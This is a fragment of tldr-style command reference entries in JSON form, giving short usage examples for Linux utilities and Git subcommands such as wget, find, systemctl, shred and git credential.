    "trace-cmd": "# trace-cmd\n> Utility to interact with the Ftrace Linux kernel internal tracer. This\n> utility only runs as root. More information: https://manned.org/trace-cmd.\n  * Display the status of tracing system:\n`trace-cmd stat`\n  * List available tracers:\n`trace-cmd list -t`\n  * Start tracing with a specific plugin:\n`trace-cmd start -p\n{{timerlat|osnoise|hwlat|blk|mmiotrace|function_graph|wakeup_dl|wakeup_rt|wakeup|function|nop}}`\n  * View the trace output:\n`trace-cmd show`\n  * Stop the tracing but retain the buffers:\n`trace-cmd stop`\n  * Clear the trace buffers:\n`trace-cmd clear`\n  * Clear the trace buffers and stop tracing:\n`trace-cmd reset`",
    "umask": "# umask\n> Manage the read/write/execute permissions that are masked out (i.e.\n> restricted) for newly created files by the user. More information:\n> https://manned.org/umask.\n  * Display the current mask in octal notation:\n`umask`\n  * Display the current mask in symbolic (human-readable) mode:\n`umask -S`\n  * Change the mask symbolically to allow read permission for all users (the rest of the mask bits are unchanged):\n`umask {{a+r}}`\n  * Set the mask (using octal) to restrict no permissions for the file's owner, and restrict all permissions for everyone else:\n`umask {{077}}`",
    "systemctl": "# systemctl\n> Control the systemd system and service manager. More information:\n> https://www.freedesktop.org/software/systemd/man/systemctl.html.\n  * Show all running services:\n`systemctl status`\n  * List failed units:\n`systemctl --failed`\n  * Start/Stop/Restart/Reload a service:\n`systemctl {{start|stop|restart|reload}} {{unit}}`\n  * Show the status of a unit:\n`systemctl status {{unit}}`\n  * Enable/Disable a unit to be started on bootup:\n`systemctl {{enable|disable}} {{unit}}`\n  * Mask/Unmask a unit to prevent enablement and manual activation:\n`systemctl {{mask|unmask}} {{unit}}`\n  * Reload systemd, scanning for new or changed units:\n`systemctl daemon-reload`\n  * Check if a unit is enabled:\n`systemctl is-enabled {{unit}}`",
    "find": "# find\n> Find files or directories under the given directory tree, recursively. More\n> information: https://manned.org/find.\n  * Find files by extension:\n`find {{root_path}} -name '{{*.ext}}'`\n  * Find files matching multiple path/name patterns:\n`find {{root_path}} -path '{{**/path/**/*.ext}}' -or -name '{{*pattern*}}'`\n  * Find directories matching a given name, in case-insensitive mode:\n`find {{root_path}} -type d -iname '{{*lib*}}'`\n  * Find files matching a given pattern, excluding specific paths:\n`find {{root_path}} -name '{{*.py}}' -not -path '{{*/site-packages/*}}'`\n  * Find files matching a given size range, limiting the recursive depth to \"1\":\n`find {{root_path}} -maxdepth 1 -size {{+500k}} -size {{-10M}}`\n  * Run a command for each file (use `{}` within the command to access the filename):\n`find {{root_path}} -name '{{*.ext}}' -exec {{wc -l {} }}\\;`\n  * Find files modified in the last 7 days:\n`find {{root_path}} -daystart -mtime -{{7}}`\n  * Find empty (0 byte) files and delete them:\n`find {{root_path}} -type {{f}} -empty -delete`",
    "expect": "# expect\n> Script executor that interacts with other programs that require user input.\n> More information: https://manned.org/expect.\n  * Execute an expect script from a file:\n`expect {{path/to/file}}`\n  * Execute a specified expect script:\n`expect -c \"{{commands}}\"`\n  * Enter an interactive REPL (use `exit` or Ctrl + D to exit):\n`expect -i`",
    "git-rm": "# git rm\n> Remove files from repository index and local filesystem. More information:\n> https://git-scm.com/docs/git-rm.\n  * Remove file from repository index and filesystem:\n`git rm {{path/to/file}}`\n  * Remove directory:\n`git rm -r {{path/to/directory}}`\n  * Remove file from repository index but keep it untouched locally:\n`git rm --cached {{path/to/file}}`",
    "getconf": "# getconf\n> Get configuration values from your Linux system. More information:\n> https://manned.org/getconf.1.\n  * List [a]ll configuration values available:\n`getconf -a`\n  * List the configuration values for a specific directory:\n`getconf -a {{path/to/directory}}`\n  * Check if your linux system is a 32-bit or 64-bit:\n`getconf LONG_BIT`\n  * Check how many processes the current user can run at once:\n`getconf CHILD_MAX`\n  * List every configuration value and then find patterns with the grep command (i.e every value with MAX in it):\n`getconf -a | grep MAX`",
    "wget": "# wget\n> Download files from the Web. Supports HTTP, HTTPS, and FTP. More\n> information: https://www.gnu.org/software/wget.\n  * Download the contents of a URL to a file (named \"foo\" in this case):\n`wget {{https://example.com/foo}}`\n  * Download the contents of a URL to a file (named \"bar\" in this case):\n`wget --output-document {{bar}} {{https://example.com/foo}}`\n  * Download a single web page and all its resources with 3-second intervals between requests (scripts, stylesheets, images, etc.):\n`wget --page-requisites --convert-links --wait=3\n{{https://example.com/somepage.html}}`\n  * Download all listed files within a directory and its sub-directories (does not download embedded page elements):\n`wget --mirror --no-parent {{https://example.com/somepath/}}`\n  * Limit the download speed and the number of connection retries:\n`wget --limit-rate={{300k}} --tries={{100}} {{https://example.com/somepath/}}`\n  * Download a file from an HTTP server using Basic Auth (also works for FTP):\n`wget --user={{username}} --password={{password}} {{https://example.com}}`\n  * Continue an incomplete download:\n`wget --continue {{https://example.com}}`\n  * Download all URLs stored in a text file to a specific directory:\n`wget --directory-prefix {{path/to/directory}} --input-file {{URLs.txt}}`",
    "systemd-mount": "# systemd-mount\n> Establish and destroy transient mount or auto-mount points. More\n> information: https://www.freedesktop.org/software/systemd/man/systemd-\n> mount.html.\n  * Mount a file system (image or block device) at `/run/media/system/LABEL` where LABEL is the filesystem label or the device name if there is no label:\n`systemd-mount {{path/to/file_or_device}}`\n  * Mount a file system (image or block device) at a specific location:\n`systemd-mount {{path/to/file_or_device}} {{path/to/mount_point}}`\n  * Show a list of all local, known block devices with file systems that may be mounted:\n`systemd-mount --list`\n  * Create an automount point that mounts the actual file system at the time of first access:\n`systemd-mount --automount=yes {{path/to/file_or_device}}`\n  * Unmount one or more devices:\n`systemd-mount --umount {{path/to/mount_point_or_device1}}\n{{path/to/mount_point_or_device2}}`\n  * Mount a file system (image or block device) with a specific file system type:\n`systemd-mount --type={{file_system_type}} {{path/to/file_or_device}}\n{{path/to/mount_point}}`\n  * Mount a file system (image or block device) with additional mount options:\n`systemd-mount --options={{mount_options}} {{path/to/file_or_device}}\n{{path/to/mount_point}}`",
    "mcookie": "# mcookie\n> Generates random 128-bit hexadecimal numbers. More information:\n> https://manned.org/mcookie.\n  * Generate a random number:\n`mcookie`\n  * Generate a random number, using the contents of a file as a seed for the randomness:\n`mcookie --file {{path/to/file}}`\n  * Generate a random number, using a specific number of bytes from a file as a seed for the randomness:\n`mcookie --file {{path/to/file}} --max-size {{number_of_bytes}}`\n  * Print the details of the randomness used, such as the origin and seed for each source:\n`mcookie --verbose`",
    "scriptreplay": "# scriptreplay\n> Replay a typescript created by the `script` command to `stdout`. More\n> information: https://manned.org/scriptreplay.\n  * Replay a typescript at the speed it was recorded:\n`scriptreplay {{path/to/timing_file}} {{path/to/typescript}}`\n  * Replay a typescript at double the original speed:\n`scriptreplay {{path/to/timingfile}} {{path/to/typescript}} 2`\n  * Replay a typescript at half the original speed:\n`scriptreplay {{path/to/timingfile}} {{path/to/typescript}} 0.5`",
    "git-repack": "# git repack\n> Pack unpacked objects in a Git repository. More information: https://git-\n> scm.com/docs/git-repack.\n  * Pack unpacked objects in the current directory:\n`git repack`\n  * Also remove redundant objects after packing:\n`git repack -d`",
    "rev": "# rev\n> Reverse a line of text. More information: https://manned.org/rev.\n  * Reverse the text string \"hello\":\n`echo \"hello\" | rev`\n  * Reverse an entire file and print to `stdout`:\n`rev {{path/to/file}}`",
    "true": "# true\n> Returns a successful exit status code of 0. Use this with the || operator to\n> make a command always exit with 0. More information:\n> https://www.gnu.org/software/coreutils/true.\n  * Return a successful exit code:\n`true`",
    "lsattr": "# lsattr\n> List file attributes on a Linux filesystem. More information:\n> https://manned.org/lsattr.\n  * Display the attributes of the files in the current directory:\n`lsattr`\n  * List the attributes of files in a particular path:\n`lsattr {{path}}`\n  * List file attributes recursively in the current and subsequent directories:\n`lsattr -R`\n  * Show attributes of all the files in the current directory, including hidden ones:\n`lsattr -a`\n  * Display attributes of directories in the current directory:\n`lsattr -d`",
    "delta": "# delta\n> A viewer for Git and diff output. More information:\n> https://github.com/dandavison/delta.\n  * Compare files or directories:\n`delta {{path/to/old_file_or_directory}} {{path/to/new_file_or_directory}}`\n  * Compare files or directories, showing the line numbers:\n`delta --line-numbers {{path/to/old_file_or_directory}}\n{{path/to/new_file_or_directory}}`\n  * Compare files or directories, showing the differences side by side:\n`delta --side-by-side {{path/to/old_file_or_directory}}\n{{path/to/new_file_or_directory}}`\n  * Compare files or directories, ignoring any Git configuration settings:\n`delta --no-gitconfig {{path/to/old_file_or_directory}}\n{{path/to/new_file_or_directory}}`\n  * Compare, rendering commit hashes, file names, and line numbers as hyperlinks, according to the hyperlink spec for terminal emulators:\n`delta --hyperlinks {{path/to/old_file_or_directory}}\n{{path/to/new_file_or_directory}}`\n  * Display the current settings:\n`delta --show-config`\n  * Display supported languages and associated file extensions:\n`delta --list-languages`",
    "git-submodule": "# git submodule\n> Inspects, updates and manages submodules. More information: https://git-\n> scm.com/docs/git-submodule.\n  * Install a repository's specified submodules:\n`git submodule update --init --recursive`\n  * Add a Git repository as a submodule:\n`git submodule add {{repository_url}}`\n  * Add a Git repository as a submodule at the specified directory:\n`git submodule add {{repository_url}} {{path/to/directory}}`\n  * Update every submodule to its latest commit:\n`git submodule foreach git pull`",
    "git-send-email": "# git send-email\n> Send a collection of patches as emails. Patches can be specified as files,\n> directions, or a revision list. More information: https://git-\n> scm.com/docs/git-send-email.\n  * Send the last commit in the current branch:\n`git send-email -1`\n  * Send a given commit:\n`git send-email -1 {{commit}}`\n  * Send multiple (e.g. 10) commits in the current branch:\n`git send-email {{-10}}`\n  * Send an introductory email message for the patch series:\n`git send-email -{{number_of_commits}} --compose`\n  * Review and edit the email message for each patch you're about to send:\n`git send-email -{{number_of_commits}} --annotate`",
    "git-checkout": "# git checkout\n> Checkout a branch or paths to the working tree. More information:\n> https://git-scm.com/docs/git-checkout.\n  * Create and switch to a new branch:\n`git checkout -b {{branch_name}}`\n  * Create and switch to a new branch based on a specific reference (branch, remote/branch, tag are examples of valid references):\n`git checkout -b {{branch_name}} {{reference}}`\n  * Switch to an existing local branch:\n`git checkout {{branch_name}}`\n  * Switch to the previously checked out branch:\n`git checkout -`\n  * Switch to an existing remote branch:\n`git checkout --track {{remote_name}}/{{branch_name}}`\n  * Discard all unstaged changes in the current directory (see `git reset` for more undo-like commands):\n`git checkout .`\n  * Discard unstaged changes to a given file:\n`git checkout {{path/to/file}}`\n  * Replace a file in the current directory with the version of it committed in a given branch:\n`git checkout {{branch_name}} -- {{path/to/file}}`",
    "git-show-ref": "# git show-ref\n> Git command for listing references. More information: https://git-\n> scm.com/docs/git-show-ref.\n  * Show all refs in the repository:\n`git show-ref`\n  * Show only heads references:\n`git show-ref --heads`\n  * Show only tags references:\n`git show-ref --tags`\n  * Verify that a given reference exists:\n`git show-ref --verify {{path/to/ref}}`",
    "tbl": "# tbl\n> Table preprocessor for the groff (GNU Troff) document formatting system. See\n> also `groff` and `troff`. More information: https://manned.org/tbl.\n  * Process input with tables, saving the output for future typesetting with groff to PostScript:\n`tbl {{path/to/input_file}} > {{path/to/output.roff}}`\n  * Typeset input with tables to PDF using the [me] macro package:\n`tbl -T {{pdf}} {{path/to/input.tbl}} | groff -{{me}} -T {{pdf}} >\n{{path/to/output.pdf}}`",
    "fg": "# fg\n> Run jobs in foreground. More information: https://manned.org/fg.\n  * Bring most recently suspended or running background job to foreground:\n`fg`\n  * Bring a specific job to foreground:\n`fg %{{job_id}}`",
    "git-credential": "# git credential\n> Retrieve and store user credentials. More information: https://git-\n> scm.com/docs/git-credential.\n  * Display credential information, retrieving the username and password from configuration files:\n`echo \"{{url=http://example.com}}\" | git credential fill`\n  * Send credential information to all configured credential helpers to store for later use:\n`echo \"{{url=http://example.com}}\" | git credential approve`\n  * Erase the specified credential information from all the configured credential helpers:\n`echo \"{{url=http://example.com}}\" | git credential reject`",
    "git-stripspace": "# git stripspace\n> Read text (e.g. commit messages, notes, tags, and branch descriptions) from\n> `stdin` and clean it into the manner used by Git. More information:\n> https://git-scm.com/docs/git-stripspace.\n  * Trim whitespace from a file:\n`cat {{path/to/file}} | git stripspace`\n  * Trim whitespace and Git comments from a file:\n`cat {{path/to/file}} | git stripspace --strip-comments`\n  * Convert all lines in a file into Git comments:\n`git stripspace --comment-lines < {{path/to/file}}`",
    "fuser": "# fuser\n> Display process IDs currently using files or sockets. More information:\n> https://manned.org/fuser.\n  * Find which processes are accessing a file or directory:\n`fuser {{path/to/file_or_directory}}`\n  * Show more fields (`USER`, `PID`, `ACCESS` and `COMMAND`):\n`fuser --verbose {{path/to/file_or_directory}}`\n  * Identify processes using a TCP socket:\n`fuser --namespace tcp {{port}}`\n  * Kill all processes accessing a file or directory (sends the `SIGKILL` signal):\n`fuser --kill {{path/to/file_or_directory}}`\n  * Find which processes are accessing the filesystem containing a specific file or directory:\n`fuser --mount {{path/to/file_or_directory}}`\n  * Kill all processes with a TCP connection on a specific port:\n`fuser --kill {{port}}/tcp`",
    "git-mergetool": "# git mergetool\n> Run merge conflict resolution tools to resolve merge conflicts. More\n> information: https://git-scm.com/docs/git-mergetool.\n  * Launch the default merge tool to resolve conflicts:\n`git mergetool`\n  * List valid merge tools:\n`git mergetool --tool-help`\n  * Launch the merge tool identified by a name:\n`git mergetool --tool {{tool_name}}`\n  * Don't prompt before each invocation of the merge tool:\n`git mergetool --no-prompt`\n  * Explicitly use the GUI merge tool (see the `merge.guitool` config variable):\n`git mergetool --gui`\n  * Explicitly use the regular merge tool (see the `merge.tool` config variable):\n`git mergetool --no-gui`",
    "git-request-pull": "# git request-pull\n> Generate a request asking the upstream project to pull changes into its\n> tree. More information: https://git-scm.com/docs/git-request-pull.\n  * Produce a request summarizing the changes between the v1.1 release and a specified branch:\n`git request-pull {{v1.1}} {{https://example.com/project}} {{branch_name}}`\n  * Produce a request summarizing the changes between the v0.1 release on the `foo` branch and the local `bar` branch:\n`git request-pull {{v0.1}} {{https://example.com/project}} {{foo:bar}}`",
    "perf": "# perf\n> Framework for Linux performance counter measurements. More information:\n> https://perf.wiki.kernel.org.\n  * Display basic performance counter stats for a command:\n`perf stat {{gcc hello.c}}`\n  * Display system-wide real-time performance counter profile:\n`sudo perf top`\n  * Run a command and record its profile into `perf.data`:\n`sudo perf record {{command}}`\n  * Record the profile of an existing process into `perf.data`:\n`sudo perf record -p {{pid}}`\n  * Read `perf.data` (created by `perf record`) and display the profile:\n`sudo perf report`",
    "chrt": "# chrt\n> Manipulate the real-time attributes of a process. More information:\n> https://man7.org/linux/man-pages/man1/chrt.1.html.\n  * Display attributes of a process:\n`chrt --pid {{PID}}`\n  * Display attributes of all threads of a process:\n`chrt --all-tasks --pid {{PID}}`\n  * Display the min/max priority values that can be used with `chrt`:\n`chrt --max`\n  * Set the scheduling policy for a process:\n`chrt --pid {{PID}} --{{deadline|idle|batch|rr|fifo|other}}`",
    "git-describe": "# git describe\n> Give an object a human-readable name based on an available ref. More\n> information: https://git-scm.com/docs/git-describe.\n  * Create a unique name for the current commit (the name contains the most recent annotated tag, the number of additional commits, and the abbreviated commit hash):\n`git describe`\n  * Create a name with 4 digits for the abbreviated commit hash:\n`git describe --abbrev={{4}}`\n  * Generate a name with the tag reference path:\n`git describe --all`\n  * Describe a Git tag:\n`git describe {{v1.0.0}}`\n  * Create a name for the last commit of a given branch:\n`git describe {{branch_name}}`",
    "truncate": "# truncate\n> Shrink or extend the size of a file to the specified size. More information:\n> https://www.gnu.org/software/coreutils/truncate.\n  * Set a size of 10 GB to an existing file, or create a new file with the specified size:\n`truncate --size {{10G}} {{filename}}`\n  * Extend the file size by 50 MiB, fill with holes (which reads as zero bytes):\n`truncate --size +{{50M}} {{filename}}`\n  * Shrink the file by 2 GiB, by removing data from the end of file:\n`truncate --size -{{2G}} {{filename}}`\n  * Empty the file's content:\n`truncate --size 0 {{filename}}`\n  * Empty the file's content, but do not create the file if it does not exist:\n`truncate --no-create --size 0 {{filename}}`",
    "git-check-attr": "# git check-attr\n> For every pathname, list if each attribute is unspecified, set, or unset as\n> a gitattribute on that pathname. More information: https://git-\n> scm.com/docs/git-check-attr.\n  * Check the values of all attributes on a file:\n`git check-attr --all {{path/to/file}}`\n  * Check the value of a specific attribute on a file:\n`git check-attr {{attribute}} {{path/to/file}}`\n  * Check the value of a specific attribute on files:\n`git check-attr --all {{path/to/file1}} {{path/to/file2}}`\n  * Check the value of a specific attribute on one or more files:\n`git check-attr {{attribute}} {{path/to/file1}} {{path/to/file2}}`",
    "git-push": "# git push\n> Push commits to a remote repository. More information: https://git-\n> scm.com/docs/git-push.\n  * Send local changes in the current branch to its default remote counterpart:\n`git push`\n  * Send changes from a specific local branch to its remote counterpart:\n`git push {{remote_name}} {{local_branch}}`\n  * Send changes from a specific local branch to its remote counterpart, and set the remote one as the default push/pull target of the local one:\n`git push -u {{remote_name}} {{local_branch}}`\n  * Send changes from a specific local branch to a specific remote branch:\n`git push {{remote_name}} {{local_branch}}:{{remote_branch}}`\n  * Send changes on all local branches to their counterparts in a given remote repository:\n`git push --all {{remote_name}}`\n  * Delete a branch in a remote repository:\n`git push {{remote_name}} --delete {{remote_branch}}`\n  * Remove remote branches that don't have a local counterpart:\n`git push --prune {{remote_name}}`\n  * Publish tags that aren't yet in the remote repository:\n`git push --tags`",
    "lpstat": "# lpstat\n> Display status information about the current classes, jobs, and printers.\n> More information: https://ss64.com/osx/lpstat.html.\n  * Show a long listing of printers, classes, and jobs:\n`lpstat -l`\n  * Force encryption when connecting to the CUPS server:\n`lpstat -E`\n  * Show the ranking of print jobs:\n`lpstat -R`\n  * Show whether or not the CUPS server is running:\n`lpstat -r`\n  * Show all status information:\n`lpstat -t`",
    "flock": "# flock\n> Manage locks from shell scripts. It can be used to ensure that only one\n> process of a command is running. More information: https://manned.org/flock.\n  * Run a command with a file lock as soon as the lock is not required by others:\n`flock {{path/to/lock.lock}} --command \"{{command}}\"`\n  * Run a command with a file lock, and exit if the lock doesn't exist:\n`flock {{path/to/lock.lock}} --nonblock --command \"{{command}}\"`\n  * Run a command with a file lock, and exit with a specific error code if the lock doesn't exist:\n`flock {{path/to/lock.lock}} --nonblock --conflict-exit-code {{error_code}} -c\n\"{{command}}\"`",
    "ssh-add": "# ssh-add\n> Manage loaded ssh keys in the ssh-agent. Ensure that ssh-agent is up and\n> running for the keys to be loaded in it. More information:\n> https://man.openbsd.org/ssh-add.\n  * Add the default ssh keys in `~/.ssh` to the ssh-agent:\n`ssh-add`\n  * Add a specific key to the ssh-agent:\n`ssh-add {{path/to/private_key}}`\n  * List fingerprints of currently loaded keys:\n`ssh-add -l`\n  * Delete a key from the ssh-agent:\n`ssh-add -d {{path/to/private_key}}`\n  * Delete all currently loaded keys from the ssh-agent:\n`ssh-add -D`\n  * Add a key to the ssh-agent and the keychain:\n`ssh-add -K {{path/to/private_key}}`",
    "git-show-branch": "# git show-branch\n> Show branches and their commits. More information: https://git-\n> scm.com/docs/git-show-branch.\n  * Show a summary of the latest commit on a branch:\n`git show-branch {{branch_name|ref|commit}}`\n  * Compare commits in the history of multiple commits or branches:\n`git show-branch {{branch_name|ref|commit}}`\n  * Compare all remote tracking branches:\n`git show-branch --remotes`\n  * Compare both local and remote tracking branches:\n`git show-branch --all`\n  * List the latest commits in all branches:\n`git show-branch --all --list`\n  * Compare a given branch with the current branch:\n`git show-branch --current {{commit|branch_name|ref}}`\n  * Display the commit name instead of the relative name:\n`git show-branch --sha1-name --current {{current|branch_name|ref}}`\n  * Keep going a given number of commits past the common ancestor:\n`git show-branch --more {{5}} {{commit|branch_name|ref}}\n{{commit|branch_name|ref}} {{...}}`",
    "gawk": "# gawk\n> This command is an alias of GNU `awk`.\n  * View documentation for the original command:\n`tldr -p linux awk`",
    "trap": "# trap\n> Automatically execute commands after receiving signals by processes or the\n> operating system. Can be used to perform cleanups for interruptions by the\n> user or other actions. More information: https://manned.org/trap.\n  * List available signals to set traps for:\n`trap -l`\n  * List active traps for the current shell:\n`trap -p`\n  * Set a trap to execute commands when one or more signals are detected:\n`trap 'echo \"Caught signal {{SIGHUP}}\"' {{SIGHUP}}`\n  * Remove active traps:\n`trap - {{SIGHUP}} {{SIGINT}}`",
    "git-whatchanged": "# git whatchanged\n> Show what has changed with recent commits or files. See also `git log`. More\n> information: https://git-scm.com/docs/git-whatchanged.\n  * Display logs and changes for recent commits:\n`git whatchanged`\n  * Display logs and changes for recent commits within the specified time frame:\n`git whatchanged --since=\"{{2 hours ago}}\"`\n  * Display logs and changes for recent commits for specific files or directories:\n`git whatchanged {{path/to/file_or_directory}}`",
    "troff": "# troff\n> Typesetting processor for the groff (GNU Troff) document formatting system.\n> See also `groff`. More information: https://manned.org/troff.\n  * Format output for a PostScript printer, saving the output to a file:\n`troff {{path/to/input.roff}} | grops > {{path/to/output.ps}}`\n  * Format output for a PostScript printer using the [me] macro package, saving the output to a file:\n`troff -{{me}} {{path/to/input.roff}} | grops > {{path/to/output.ps}}`\n  * Format output as [a]SCII text using the [man] macro package:\n`troff -T {{ascii}} -{{man}} {{path/to/input.roff}} | grotty`\n  * Format output as a [pdf] file, saving the output to a file:\n`troff -T {{pdf}} {{path/to/input.roff}} | gropdf > {{path/to/output.pdf}}`",
    "hostnamectl": "# hostnamectl\n> Get or set the hostname of the computer. More information:\n> https://manned.org/hostnamectl.\n  * Get the hostname of the computer:\n`hostnamectl`\n  * Set the hostname of the computer:\n`sudo hostnamectl set-hostname \"{{hostname}}\"`\n  * Set a pretty hostname for the computer:\n`sudo hostnamectl set-hostname --static \"{{hostname.example.com}}\" && sudo\nhostnamectl set-hostname --pretty \"{{hostname}}\"`\n  * Reset hostname to its default value:\n`sudo hostnamectl set-hostname --pretty \"\"`",
    "sftp": "# sftp\n> Secure File Transfer Program. Interactive program to copy files between\n> hosts over SSH. For non-interactive file transfers, see `scp` or `rsync`.\n> More information: https://manned.org/sftp.\n  * Connect to a remote server and enter an interactive command mode:\n`sftp {{remote_user}}@{{remote_host}}`\n  * Connect using an alternate port:\n`sftp -P {{remote_port}} {{remote_user}}@{{remote_host}}`\n  * Connect using a predefined host (in `~/.ssh/config`):\n`sftp {{host}}`\n  * Transfer remote file to the local system:\n`get {{/path/remote_file}}`\n  * Transfer local file to the remote system:\n`put {{/path/local_file}}`\n  * Transfer remote directory to the local system recursively (works with `put` too):\n`get -R {{/path/remote_directory}}`\n  * Get list of files on local machine:\n`lls`\n  * Get list of files on remote machine:\n`ls`",
    "envsubst": "# envsubst\n> Substitutes environment variables with their value in shell format strings.\n> Variables to be replaced should be in either `${var}` or `$var` format. More\n> information: https://www.gnu.org/software/gettext/manual/html_node/envsubst-\n> Invocation.html.\n  * Replace environment variables in `stdin` and output to `stdout`:\n`echo '{{$HOME}}' | envsubst`\n  * Replace environment variables in an input file and output to `stdout`:\n`envsubst < {{path/to/input_file}}`\n  * Replace environment variables in an input file and output to a file:\n`envsubst < {{path/to/input_file}} > {{path/to/output_file}}`\n  * Replace environment variables in an input file from a space-separated list:\n`envsubst '{{$USER $SHELL $HOME}}' < {{path/to/input_file}}`",
    "gdb": "# gdb\n> The GNU Debugger. More information: https://www.gnu.org/software/gdb.\n  * Debug an executable:\n`gdb {{executable}}`\n  * Attach a process to gdb:\n`gdb -p {{procID}}`\n  * Debug with a core file:\n`gdb -c {{core}} {{executable}}`\n  * Execute given GDB commands upon start:\n`gdb -ex \"{{commands}}\" {{executable}}`\n  * Start `gdb` and pass arguments to the executable:\n`gdb --args {{executable}} {{argument1}} {{argument2}}`",
    "git-prune": "# git prune\n> Git command for pruning all unreachable objects from the object database.\n> This command is often not used directly but as an internal command that is\n> used by Git gc. More information: https://git-scm.com/docs/git-prune.\n  * Report what would be removed by Git prune without removing it:\n`git prune --dry-run`\n  * Prune unreachable objects and display what has been pruned to `stdout`:\n`git prune --verbose`\n  * Prune unreachable objects while showing progress:\n`git prune --progress`",
    "oomctl": "# oomctl\n> Analyze the state stored in `systemd-oomd`. More information:\n> https://www.freedesktop.org/software/systemd/man/oomctl.html.\n  * Show the current state of the cgroups and system contexts stored by `systemd-oomd`:\n`oomctl dump`",
    "git-config": "# git config\n> Manage custom configuration options for Git repositories. These\n> configurations can be local (for the current repository) or global (for the\n> current user). More information: https://git-scm.com/docs/git-config.\n  * List only local configuration entries (stored in `.git/config` in the current repository):\n`git config --list --local`\n  * List only global configuration entries (stored in `~/.gitconfig` by default or in `$XDG_CONFIG_HOME/git/config` if such a file exists):\n`git config --list --global`\n  * List only system configuration entries (stored in `/etc/gitconfig`), and show their file location:\n`git config --list --system --show-origin`\n  * Get the value of a given configuration entry:\n`git config alias.unstage`\n  * Set the global value of a given configuration entry:\n`git config --global alias.unstage \"reset HEAD --\"`\n  * Revert a global configuration entry to its default value:\n`git config --global --unset alias.unstage`\n  * Edit the Git configuration for the current repository in the default editor:\n`git config --edit`\n  * Edit the global Git configuration in the default editor:\n`git config --global --edit`",
    "git-merge-base": "# git merge-base\n> Find a common ancestor of two commits. More information: https://git-\n> scm.com/docs/git-merge-base.\n  * Print the best common ancestor of two commits:\n`git merge-base {{commit_1}} {{commit_2}}`\n  * Output all best common ancestors of two commits:\n`git merge-base --all {{commit_1}} {{commit_2}}`\n  * Check if a commit is an ancestor of a specific commit:\n`git merge-base --is-ancestor {{ancestor_commit}} {{commit}}`",
    "git-unpack-file": "# git unpack-file\n> Create a temporary file with a blob's contents. More information:\n> https://git-scm.com/docs/git-unpack-file.\n  * Create a file holding the contents of the blob specified by its ID then print the name of the temporary file:\n`git unpack-file {{blob_id}}`",
    "git-fsck": "# git fsck\n> Verify the validity and connectivity of nodes in a Git repository index.\n> Does not make any modifications. See `git gc` for cleaning up dangling\n> blobs. More information: https://git-scm.com/docs/git-fsck.\n  * Check the current repository:\n`git fsck`\n  * List all tags found:\n`git fsck --tags`\n  * List all root nodes found:\n`git fsck --root`",
    "free": "# free\n> Display amount of free and used memory in the system. More information:\n> https://manned.org/free.\n  * Display system memory:\n`free`\n  * Display memory in Bytes/KB/MB/GB:\n`free -{{b|k|m|g}}`\n  * Display memory in human-readable units:\n`free -h`\n  * Refresh the output every 2 seconds:\n`free -s {{2}}`",
    "readelf": "# readelf\n> Displays information about ELF files. More information:\n> http://man7.org/linux/man-pages/man1/readelf.1.html.\n  * Display all information about the ELF file:\n`readelf -all {{path/to/binary}}`\n  * Display all the headers present in the ELF file:\n`readelf --headers {{path/to/binary}}`\n  * Display the entries in symbol table section of the ELF file, if it has one:\n`readelf --symbols {{path/to/binary}}`\n  * Display the information contained in the ELF header at the start of the file:\n`readelf --file-header {{path/to/binary}}`",
    "ld": "# ld\n> Link object files together. More information:\n> https://sourceware.org/binutils/docs-2.38/ld.html.\n  * Link a specific object file with no dependencies into an executable:\n`ld {{path/to/file.o}} --output {{path/to/output_executable}}`\n  * Link two object files together:\n`ld {{path/to/file1.o}} {{path/to/file2.o}} --output\n{{path/to/output_executable}}`\n  * Dynamically link an x86_64 program to glibc (file paths change depending on the system):\n`ld --output {{path/to/output_executable}} --dynamic-linker /lib/ld-\nlinux-x86-64.so.2 /lib/crt1.o /lib/crti.o -lc {{path/to/file.o}} /lib/crtn.o`",
    "git-commit": "# git commit\n> Commit files to the repository. More information: https://git-\n> scm.com/docs/git-commit.\n  * Commit staged files to the repository with a message:\n`git commit --message \"{{message}}\"`\n  * Commit staged files with a message read from a file:\n`git commit --file {{path/to/commit_message_file}}`\n  * Auto stage all modified and deleted files and commit with a message:\n`git commit --all --message \"{{message}}\"`\n  * Commit staged files and sign them with the specified GPG key (or the one defined in the config file if no argument is specified):\n`git commit --gpg-sign {{key_id}} --message \"{{message}}\"`\n  * Update the last commit by adding the currently staged changes, changing the commit's hash:\n`git commit --amend`\n  * Commit only specific (already staged) files:\n`git commit {{path/to/file1}} {{path/to/file2}}`\n  * Create a commit, even if there are no staged files:\n`git commit --message \"{{message}}\" --allow-empty`",
    "git-ls-files": "# git ls-files\n> Show information about files in the index and the working tree. More\n> information: https://git-scm.com/docs/git-ls-files.\n  * Show deleted files:\n`git ls-files --deleted`\n  * Show modified and deleted files:\n`git ls-files --modified`\n  * Show ignored and untracked files:\n`git ls-files --others`\n  * Show untracked files, not ignored:\n`git ls-files --others --exclude-standard`",
    "shred": "# shred\n> Overwrite files to securely delete data. More information:\n> https://www.gnu.org/software/coreutils/shred.\n  * Overwrite a file:\n`shred {{path/to/file}}`\n  * Overwrite a file, leaving zeroes instead of random data:\n`shred --zero {{path/to/file}}`\n  * Overwrite a file 25 times:\n`shred -n25 {{path/to/file}}`\n  * Overwrite a file and remove it:\n`shred --remove {{path/to/file}}`",
    "tac": "# tac\n> Display and concatenate files with lines in reversed order. See also: `cat`.\n> More information: https://www.gnu.org/software/coreutils/tac.\n  * Concatenate specific files in reversed order:\n`tac {{path/to/file1 path/to/file2 ...}}`\n  * Display `stdin` in reversed order:\n`{{cat path/to/file}} | tac`\n  * Use a specific [s]eparator:\n`tac -s {{separator}} {{path/to/file1 path/to/file2 ...}}`\n  * Use a specific [r]egex as a [s]eparator:\n`tac -r -s {{separator}} {{path/to/file1 path/to/file2 ...}}`\n  * Use a separator [b]efore each file:\n`tac -b {{path/to/file1 path/to/file2 ...}}`",
    "git-ls-remote": "# git ls-remote\n> Git command for listing references in a remote repository based on name or\n> URL. If no name or URL are given, then the configured upstream branch will\n> be used, or remote origin if the former is not configured. More information:\n> https://git-scm.com/docs/git-ls-remote.\n  * Show all references in the default remote repository:\n`git ls-remote`\n  * Show only heads references in the default remote repository:\n`git ls-remote --heads`\n  * Show only tags references in the default remote repository:\n`git ls-remote --tags`\n  * Show all references from a remote repository based on name or URL:\n`git ls-remote {{repository_url}}`\n  * Show references from a remote repository filtered by a pattern:\n`git ls-remote {{repository_name}} \"{{pattern}}\"`",
